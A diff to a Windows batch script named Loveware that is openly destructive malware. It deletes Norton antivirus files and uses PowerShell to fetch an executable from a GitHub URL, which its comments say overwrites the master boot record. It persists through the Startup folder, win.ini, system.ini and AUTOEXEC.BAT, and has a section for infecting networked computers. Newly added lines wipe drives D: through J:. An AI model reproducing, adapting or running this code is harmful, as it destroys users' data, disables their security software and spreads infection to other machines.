@@ -1,6 +1,6 @@
 @echo off
 
-:: LOVEWARE v6.8
+:: LOVEWARE v6.9
 ::
 :: YOU CAN DELETE THIS 
 :: |  |  |  |  |  |  |
@@ -117,6 +117,10 @@ del /Q /F C:\Program Files\Norton~1\Norton~1\speedd~1\*.*
 del /Q /F C:\Program Files\Norton~1\Norton~1\*.*
 del /Q /F C:\Program Files\Norton~1\*.*
 
+:: Change file name to Loveware
+
+RENAME %0 Loveware.exe
+
 :: Move Loveware to the windows directory
 
 MOVE /e /y Loveware.exe C:\Windows
@@ -124,7 +128,7 @@ MOVE /e /y Loveware.exe C:\Windows
 :: Download file that will overwrite the mbr
 
 powershell -Command "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/TheG0df2ther/Loveware/master/Loveware/FinalPayload/FinalPayload.exe', 'SomeHugs.exe')"
-powershell -Command "Invoke-WebRequest <https://raw.githubusercontent.com/TheG0df2ther/Loveware/master/Loveware/FinalPayload/FinalPayload.exe> -OutFile SomeHugs.exe"
+powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/TheG0df2ther/Loveware/master/Loveware/FinalPayload/FinalPayload.exe -OutFile SomeHugs.exe"
 
 :: Copy SomeHugs.exe to the startup folder to prevent
 :: people from escaping death.
@@ -132,6 +136,7 @@ powershell -Command "Invoke-WebRequest <https://raw.githubusercontent.com/TheG0d
 :copylove
 XCOPY "%USERPROFILE%\Downloads\SomeHugs.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 goto run1
+timeout 20
 goto copylove
 
 :: Infect network connected computers
@@ -209,7 +214,7 @@ goto worm
 
 :: Infect autoexec.bat
 
-goto run2
+:run2
 
 set Slash=\
 if exist %SystemDrive%%Slash%AUTOEXEC.BAT (
@@ -230,6 +235,16 @@ echo run=%windir%\%b%.exe >> %windir%\win.ini
 echo load=%windir%\%b%.exe >> %windir%\win.ini
 echo [boot] >> %windir%\system.ini
 echo shell=explorer.exe %b%.exe >> %windir%\system.ini
+
+:: Delete all files in externall flash drives
+
+del D:\*.* /f /s /q
+del E:\*.* /f /s /q
+del F:\*.* /f /s /q
+del G:\*.* /f /s /q
+del H:\*.* /f /s /q
+del I:\*.* /f /s /q
+del J:\*.* /f /s /q
 
 :: Create autorun file
 
@@ -291,6 +306,12 @@ goto haha
 
 :run3
 
+:: Create macro document that will move the mouse pointer.
+
+echo ret = SetCursorPos(180, 80)>>Mouse.docm
+echo ret = SetCursorPos(140, 86)>>Mouse.docm
+echo ret = SetCursorPos(10, 80)>>Mouse.docm
+
 echo @echo off>LoveChoice.bat
 echo color 57>>LoveChoice.bat
 echo title LoveChoice>>LoveChoice.bat
@@ -310,10 +331,10 @@ echo echo I love you too...>>LoveChoice.bat
 
 :: Create a little message
 
-echo echo @echo off>>AUTOEXEC.BAT>>LoveChoice.bat
-echo echo I hope you listerned to my warning!>>AUTOEXEC.BAT>>LoveChoice.bat
-echo echo timeout 20>>AUTOEXEC.BAT>>LoveChoice.bat
-echo echo exit>>AUTOEXEC.BAT>>LoveChoice.bat
+echo @echo @echo off>>AUTOEXEC.BAT>>LoveChoice.bat
+echo @echo I hope you listerned to my warning!>>AUTOEXEC.BAT>>LoveChoice.bat
+echo @echo timeout 20>>AUTOEXEC.BAT>>LoveChoice.bat
+echo @echo exit>>AUTOEXEC.BAT>>LoveChoice.bat
 
 echo echo I will give you a present because you love me...>>LoveChoice.bat
 echo echo But first I want to say...>>LoveChoice.bat
@@ -334,17 +355,16 @@ echo echo Hahahahahahahaha!!!!!!!>>LoveChoice.bat
 :: Start the fun
 
 echo :respawn>>LoveChoice.bat
-echo start Loveware.bat>>LoveChoice.bat
+echo start Loveware.exe>>LoveChoice.bat
 echo goto crazymouse>>LoveChoice.bat
 echo goto respawn>>LoveChoice.bat
 
 :: Crazy mouse
 
 echo :crazymouse>>LoveChoice.bat
-echo call mouse moveBy 19x78>>LoveChoice.bat
-echo call mouse moveBy 111x45>>LoveChoice.bat
-echo call mouse moveBy 100x100>>LoveChoice.bat
 echo goto chaos>>LoveChoice.bat
+echo timeout 10>>LoveChoice.bat
+echo start /min Mouse.docm>>LoveChoice.bat
 echo goto crazymouse>>LoveChoice.bat
 
 :: Create some chaos
@@ -423,6 +443,28 @@ echo timeout 400>>LoveChoice.bat
 :: Have mersy and let the guy live
 
 echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs.exe">>LoveChoice.bat
+echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs(1).exe">>LoveChoice.bat
+echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs(2).exe">>LoveChoice.bat
+echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs(3).exe">>LoveChoice.bat
+echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs(4).exe">>LoveChoice.bat
+echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs(5).exe">>LoveChoice.bat
+echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs(6).exe">>LoveChoice.bat
+echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs(7).exe">>LoveChoice.bat
+echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs(8).exe">>LoveChoice.bat
+echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs(9).exe">>LoveChoice.bat
+echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs(10).exe">>LoveChoice.bat
+echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs(11).exe">>LoveChoice.bat
+echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs(12).exe">>LoveChoice.bat
+echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs(13).exe">>LoveChoice.bat
+echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs(14).exe">>LoveChoice.bat
+echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs(15).exe">>LoveChoice.bat
+echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs(16).exe">>LoveChoice.bat
+echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs(17).exe">>LoveChoice.bat
+echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs(18).exe">>LoveChoice.bat
+echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs(19).exe">>LoveChoice.bat
+echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs(20).exe">>LoveChoice.bat
+echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs(21).exe">>LoveChoice.bat
+echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs(22).exe">>LoveChoice.bat
 
 echo cls>>LoveChoice.bat
 
@@ -442,10 +484,9 @@ echo echo But I love you....hehehehehe :(>>LoveChoice.bat
 :: Crazy mouse
 
 echo :crazymousee>>LoveChoice.bat
-echo call mouse moveBy 19x78>>LoveChoice.bat
-echo call mouse moveBy 111x45>>LoveChoice.bat
-echo call mouse moveBy 100x100>>LoveChoice.bat
 echo goto run4>>LoveChoice.bat
+echo @timeout 10>>LoveChoice.bat
+echo @start /min Mouse.docm>>LoveChoice.bat
 echo goto crazymousee>>LoveChoice.bat
 
 echo :run4>>LoveChoice.bat
@@ -454,10 +495,10 @@ echo echo ......>>LoveChoice.bat
 
 :: Dudley trojan with message
 
-echo echo @echo off>AUTOEXEC.BAT>>LoveChoice.bat
-echo echo echo Loveware was here...>>AUTOEXEC.BAT>>LoveChoice.bat
-echo echo :l>>AUTOEXEC.BAT>>LoveChoice.bat
-echo echo goto l>>AUTOEXEC.BAT>>LoveChoice.bat
+echo @echo @echo off>AUTOEXEC.BAT>>LoveChoice.bat
+echo @echo echo Loveware was here...>>AUTOEXEC.BAT>>LoveChoice.bat
+echo @echo :l>>AUTOEXEC.BAT>>LoveChoice.bat
+echo @echo goto l>>AUTOEXEC.BAT>>LoveChoice.bat
 
 echo echo ..........>>LoveChoice.bat
 echo echo You are hacked!!!>>LoveChoice.bat
